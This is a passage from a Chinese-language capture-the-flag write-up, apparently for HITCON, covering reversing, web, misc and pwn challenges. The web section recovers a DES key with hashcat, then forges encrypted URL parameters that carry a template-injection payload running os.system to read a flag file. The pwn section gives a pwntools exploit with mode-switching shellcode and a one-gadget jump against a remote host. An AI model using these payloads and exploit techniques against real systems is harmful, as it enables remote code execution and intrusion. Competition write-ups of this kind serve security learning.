        t3 = u32(data[0:4])   
        t4 = u32(data[4:8])   
        t1 = u32(data[8:12])   
        t2 = u32(data[12:16])
        t3 ^= 0x0EF75CB8F
        t4 ^= 0x0A037222A
        t1 ^= 0x0BA69619A
        t2 ^= 0x60798932
        for i in range(0,32,4)[::-1]:
            tt5 = to_bytes(t3)
            t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ index_table3[tt5[2]] ^ index_table4[tt5[3]]
            tt6 = to_bytes(t4)
            t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ index_table4[tt6[2]] ^ index_table1[tt6[3]]
            print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
            t2 ^= (xor_table[i+3] + t5 + t6 * 2)%0x100000000
            t2 = ROR(t2,1)
            t1 = ROL(t1,1)
            t1 ^= (xor_table[i+2] + t5 + t6)%0x100000000
            tt5 = to_bytes(t1)
            t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ index_table3[tt5[2]] ^ index_table4[tt5[3]]
            tt6 = to_bytes(t2)
            t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ index_table4[tt6[2]] ^ index_table1[tt6[3]]
            t4 ^= (xor_table[i+1] + t5 + t6 * 2)%0x100000000
            t3 = ROL(t3,1)
            t4 = ROR(t4,1)
            t3 ^=(xor_table[i] + t5 + t6)%0x100000000
            #print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
        t1 ^= 0x0C01A4D6E
        t2 ^= 0x0A4CB6636
        t3 ^= 0x5B0F5BA1
        t4 ^= 0x2B266926
        return p32(t1) + p32(t2) + p32(t3) + p32(t4)
    def xor_str(a,b):
        res = ''
        for i in xrange(16):
            res += chr(ord(a[i]) ^ ord(b[i]))
        return res
    de_flag = [0x4F, 0x6F, 0xA7, 0x87, 0xE9, 0x51, 0x87, 0x64, 0x38, 0x2A, 0x46, 0xE5, 0x4F, 0x21, 0x9E, 0x1C, 0xCD, 0x65, 0xE1, 0x9A, 0x4F, 0xCF, 0xDE, 0x52, 0x09, 0xBF, 0x53, 0xC4, 0xB0, 0x95, 0x75, 0x31, 0xAC, 0x2F, 0xF4, 0x97, 0x1D, 0xA5, 0x9A, 0x02, 0xA8, 0xFF, 0xAE, 0x2E, 0xB9, 0x70, 0xCC, 0x02]
    de_c = ''
    for i in de_flag:
        de_c += chr(i)
    # a = en('a'*16)
    # print('---')
    # print(de(a))
    print((xor_str(de_c[16:32],de(de_c[32:48]))))
    # ~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\o^_^o/
## Web
### On my raddit
8个字节分组加密，动一动LSB仍然可以解密，DES？
2e7e305f2da018a2cf8208fa1fefc238 + 加密的文件名 + 3ca92540eb2d0a42 下载文件
3ca92540eb2d0a42应该是padding，8个字节拿hashcat爆破了下
    3ca92540eb2d0a42:0808080808080808:ldgonaro
    Session..........: hashcat
    Status...........: Cracked
    Hash.Type........: DES (PT = $salt, key = $pass)
    Hash.Target......: 3ca92540eb2d0a42:0808080808080808
爆破出来一个ldgonaro，FLAG但是不对，应该是个等效密钥。  
首页有下载链接，发现能下载文件，于是解密：
    from Crypto.Cipher import DES
    key = 'ldgonaro'
    def decrypt(decryptText):
        try:
            cipherX = DES.new(key, DES.MODE_ECB)
            str = decryptText.decode('hex')
            y = cipherX.decrypt(str)
            return y[0:ord(y[len(y)-1])*-1]
        except:
            return ""
    print decrypt('2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42')
    =>m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf
将f参数换成`app.py`加密得到E2272B36277C708BC21066647BC214B8，然后得到密钥`megnnaro`
### On my raddit2
web.py的db写的有问题：
    # coding: UTF-8
    import os
    import urllib
    import urlparse
    from Crypto.Cipher import DES
    ENCRPYTION_KEY = 'megnnaro'
    def encrypt(s):
        length = DES.block_size - (len(s) % DES.block_size)
        s = s + chr(length)*length
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
        return cipher.encrypt(s).encode('hex')
    def decrypt(s):
        try:
            data = s.decode('hex')
            cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
            data = cipher.decrypt(data)
            data = data[:-ord(data[-1])]
            return dict(urlparse.parse_qsl(data))
        except Exception as e:
            print e.message
            return {}
    print encrypt(urllib.urlencode({'m':'p','l':"${[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('/read_flag > /tmp/fffza')}"}))
    print encrypt(urllib.urlencode({'m':'d','f':'/tmp/fffza'}))
然后依次访问即可。
## MISC
### Lumosity
签到题
### EV3 Basic
LEGO EV3机器人的数据包
81 xx 81 xx 84 xx 应该表示列，行，字符
    0a 14 1e 28 32 3c 46 50 5a 64 6e 78 82 8c 96 a0
    28   h  i  t  c  o  n  {  m  1  n  d  5  t  0  r  m
    36   _  c  o  m  m  u  n  i  c  a  t  i  o  n  _  a
    44   n  d  _  f  i  r  m  w  a  r  e  _  d  e  v  e
    52   l  o  p  e  r  _  k  i  t  }
### 32world
64bit ELF，retf切到32位代码，执行shellcode，24字节，syscall的时候IP需要大于FFFFFFFF
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
     0001: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0003
     0002: 0x06 0x00 0x00 0x00000000  return KILL
     0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
切回64bit，跳一个one gadget，读一下fs拿地址
    from pwn import *
    #p = process('./32world')
    p = remote('54.65.133.244', 8361)
    context(bits = 32, arch = 'i386')
    sc1 = '''
    retf
    '''
    sc11 = asm('push 0x33')
    sc1 = asm(sc1)
    print sc1, len(sc1)
    context(bits = 64, arch = 'amd64')
    sc2 = asm('mov rax, fs:[rdx+0x900]; add rax, 0xf1147; call rax')
    sc1 = sc11 + '\xe8\x10\x00\x00\x00' + sc2 + sc1
    print sc1, len(sc1)
    p.sendline(sc1)
    p.interactive()